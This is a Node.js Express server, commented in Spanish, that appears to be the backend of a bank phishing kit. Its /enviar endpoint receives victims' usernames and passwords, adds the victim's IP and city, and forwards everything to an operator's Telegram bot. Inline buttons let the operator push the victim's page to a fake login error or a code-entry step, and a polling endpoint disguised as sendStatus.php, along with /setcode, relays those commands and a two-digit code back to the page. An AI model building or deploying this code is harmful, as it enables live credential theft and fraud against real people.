const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();
const https = require('https');

// 👉 FORZAR IPv4
const agent = new https.Agent({ family: 4 });

const app = express();

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const STATUS_FILE = './status.json';

let clientes = {};
if (fs.existsSync(STATUS_FILE)) {
  clientes = JSON.parse(fs.readFileSync(STATUS_FILE));
}

function guardarEstado() {
  fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
}

// 👉 Obtener ciudad con IPv4 forzado
async function obtenerCiudad(ip) {
  try {
    const response = await fetch(`https://ipinfo.io/${ip}/json`, { agent }); // ← FORZADO IPv4
    const data = await response.json();
    return data.city || 'Ciudad desconocida';
  } catch {
    return 'Ciudad desconocida';
  }
}

// -----------------------------------------------------------
//  /enviar
// -----------------------------------------------------------
app.post('/enviar', async (req, res) => {
  const { usar, clav, txid } = req.body;

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
❤️GM4YL❤️
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clav}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔑CONFIRMAR", callback_data: `cel-dina:${txid}` }],
      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  clientes[txid] = "esperando";
  guardarEstado();

  // 👉 ENVÍO A TELEGRAM CON IPv4
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    }),
    agent // ← FORZADO IPv4
  });

  res.sendStatus(200);
});




// -----------------------------------------------------------
//  /callback
// -----------------------------------------------------------
app.post('/callback', async (req, res) => {
  const callback = req.body.callback_query;
  if (!callback || !callback.data) return res.sendStatus(400);

  const [accion, txid] = callback.data.split(":");
  clientes[txid] = accion;
  guardarEstado();

  // 👉 ENVÍO CALLBACK A TELEGRAM CON IPv4
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      callback_query_id: callback.id,
      text: `Has seleccionado: ${accion}`
    }),
    agent // ← FORZADO IPv4
  });

  res.sendStatus(200);
});

app.post('/setcode', async (req, res) => {
  const { txid, code } = req.body;

  // Validaciones básicas
  if (!txid || !code || !/^\d{2}$/.test(code)) {
    return res.status(400).json({ error: 'Faltan parámetros o código inválido (debe ser exactamente 2 dígitos)' });
  }

  // Guardamos el código asociado al txid
  if (!clientes[txid]) {
    return res.status(404).json({ error: 'txid no encontrado' });
  }

  clientes[txid] = {
    status: clientes[txid], // mantenemos el status anterior
    code: code               // agregamos el código de 2 dígitos
  };

  guardarEstado();
  res.json({ success: true, message: `Código ${code} asignado a ${txid}` });
});


// -----------------------------------------------------------
//  POLLING
// -----------------------------------------------------------
app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  const cliente = clientes[txid] || { status: "esperando" };

  let response = { status: "esperando" };

  if (typeof cliente === 'string') {
    response.status = cliente;
  } else {
    // cliente es un objeto { status, code }
    response.status = cliente.status || "esperando";
    if (cliente.code) {
      response.code = cliente.code;
    }
  }

  res.json(response);
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));

app.listen(3000, () => console.log("Servidor activo en Render puerto 3000"));
